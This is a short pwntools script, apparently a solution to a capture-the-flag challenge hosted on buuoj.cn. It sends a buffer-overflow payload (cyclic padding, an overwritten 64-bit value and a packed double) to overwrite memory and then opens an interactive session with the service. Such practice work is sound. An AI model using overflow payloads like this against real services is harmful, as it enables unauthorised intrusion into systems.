from pwn import *

context.log_level = "debug"
# r = process("./task")
r = remote("node4.buuoj.cn", 25904)
r.recvuntil(b"you.\n")
# gdb.attach(r)

payload = cyclic(0x18) + p64(0x7FFFFFFFFFFFFFFF) + struct.pack("d", 0.1)
r.send(payload)
r.interactive()
